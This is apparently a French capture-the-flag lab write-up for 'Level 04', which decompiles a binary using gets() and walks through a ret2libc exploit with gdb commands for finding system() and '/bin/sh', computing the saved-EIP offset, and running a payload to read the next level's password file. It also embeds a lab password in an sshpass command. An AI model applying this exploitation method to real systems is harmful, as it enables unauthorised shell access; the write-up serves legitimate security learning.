# Level 04

## Analyse du binaire

Lorsqu'on exécute le binaire, le message "Give me some shellcode, k" est affiché sur l'entré standard puis un input est attendu sur l'entrée standard. Ensuite le message "child is exiting..." est affiché.

On peut réécrire un code source en C de cette manière :

```c
int main(int argc, const char **argv)
{
	uint a;			  // esp+0x1c
	char buffer[128]; // esp+0x20
	uint b;			  // esp+0xa0
	uint c;			  // esp+0xa4
	uint d;			  // esp+0xa8
	pid_t child;	  // esp+0xac

	child = fork();
	bzero(buffer, 128);
	d = 0;
	a = 0;

	if (!child)
	{
		prctl(PR_SET_PDEATHSIG, 1);
		ptrace(PTRACE_TRACEME, 0, 0, 0);
		puts("Give me some shellcode, k");
		gets(buffer);
		return (0);
	}
	while (d != 11)
	{

		wait(&a);
		b = a;
		if (b & 0x7f != 0)
		{
			c = a;
			int tmp = (c & 0x7f + 1) >> 1;
			char last_byte = ((char *)&a)[3];
			last_byte >>= 1;
			if (last_byte > 0)
			{
				puts("child is exiting...");
				return 0;
			}
			d = ptrace(PTRACE_PEEKUSER, child, 2, 0);
		}
	}
	puts("no exec() for you");
	kill(child, SIGKILL);
}
```

La faille ici vient de l'utilisation de la fonction _gets_.

Le message sur la sortie standard nous pousse à insérer du shellcode et à l'exécuter. Cependant cela ne donne rien et on obtient le message _no exec() for you_.

## Ret2libc

On peut essayer d'utiliser un **ret2libc** et faire un appel à la fonction _system_.

On va donc écraser l'**eip sauvegardé** pour le remplacer par la fonction _system_ ayant pour argument "/bin/sh" et donc lancer un shell.

Il nous faut dans un premier temps, l'adresse de la fonction _system_.

On peut l'obtenir de cette manière avec gdb :

```gdb
b main
r
p system
```

Il faut ensuite une adresse qui pointe vers la chaîne de caractères "/bin/sh". On pourrait donc par exemple écrire dans une variable d'environnement "/bin/sh" et prendre l'adresse de cette variable.

On peut utiliser le programme suivant pour obtenir l'adresse exacte de la variable d'environement depuis la vm :

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	if (argc != 2)
	{
		printf("%s <ENV_VAR>\n", argv[0]);
		return 1;
	}
	char* ptr = getenv(argv[1]);
	printf("The address of environment variable \"%s\" is %p\n", argv[1], ptr);
	return 0;
}
```

Plus simple, on peut rechercher la chaîne de caractères "/bin/sh" qui est présente dans la libc. Pour ce faire avec gdb :

```gdb
b main
r
find __libc_start_main,+99999999,"/bin/sh"
```

ou avec gdb peda :

```
b main
r
find "/bin/sh"
```

Il nous reste plus qu'à trouver le padding entre notre buffer et l'**eip sauvegardé**.

Pour le buffer on peut l'obtenir de cette manière :

```gdb
b *0x0x080486cd
r
p $esp+0x20
```

et pour l'**eip sauvegardé** :

```gdb
b main
r
i f
```

La commande `i f` (info frame) affiche sur la dernière ligne, la valeur de l'**eip sauvegardé**.

On peut donc générer notre shellcode (voir Ressources/generator.cpp).

## Commandes

Depuis l'hôte :

```bash
make && ./generator && sshpass -p 'kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf' scp -P 4242 shellcode level04@localhost:/tmp/
```

Sur la vm :

```bash
cat /tmp/shellcode - | ./level04
cat /home/users/level05/.pass
```

## Sources

- https://beta.hackndo.com/retour-a-la-libc/
